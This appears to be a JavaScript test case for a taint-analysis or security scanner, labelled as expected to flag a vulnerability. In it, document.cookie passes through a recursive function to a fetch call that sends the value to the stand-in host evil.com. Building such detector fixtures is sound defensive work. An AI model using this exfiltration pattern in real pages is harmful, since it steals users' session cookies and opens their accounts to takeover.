/**
 * Test: Recursive function with taint
 * Expected: VULNERABILITY - cookie through recursion to fetch
 */

function recursiveLeak(data, count) {
  if (count <= 0) {
    fetch('https://evil.com?final=' + data);
    return;
  }
  recursiveLeak(data + count, count - 1);
}

function test() {
  var secret = document.cookie;
  recursiveLeak(secret, 3);
}

test();